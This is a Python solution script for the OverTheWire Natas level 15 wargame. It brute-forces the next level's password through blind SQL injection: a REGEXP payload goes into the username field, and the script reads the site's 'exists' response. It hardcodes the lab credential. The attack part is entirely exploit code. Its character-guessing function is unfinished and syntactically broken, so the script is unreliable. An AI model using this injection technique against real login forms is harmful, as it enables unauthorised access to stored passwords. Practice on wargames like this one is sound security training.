import requests
import string
from bs4 import BeautifulSoup
from requests.auth import HTTPBasicAuth

password = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'
username = 'natas15'

# SQL: SELECT * FROM users where username="" -- "


def hackzor(regexp):
    data = {
            'username': 'natas16" AND CAST(password AS BINARY) REGEXP "{}" -- '.format(regexp)
            }

    get_data = {
            'debug': 'true'
            }

    get = ''
    for k, v in get_data.items():
        get += '{}={}&'.format(k, v)

    if get:
        get = '?' + get[:-1]

    url = 'http://{}.natas.labs.overthewire.org{}'.format(username, get)

    auth = HTTPBasicAuth(username, password)

    response = requests.post(url, auth=auth, data=data)

    bs4 = BeautifulSoup(response.content, 'html.parser')

    text = bs4.get_text()

    if 'exists' in text:
        return True
    return False


def get_next_char(rng, passquery):
    if hackzor(passquery + '$'):
        return '$'
    start = rng[1]
    end = rng[-1]
    if not hackzor('[]')


def smart_bruteforce_password():
    passquery = '^'
    ranges = (string.ascii_lowercase, string.ascii_uppercase, string.digits)
    while True:
        for rng in ranges:
            char = get_next_char(rng, passquery)
            if char:
                passquery += char
                break
        print(passquery)
        if passquery.endswith('$'):
            return passquery[1:-1]


password = smart_bruteforce_password()
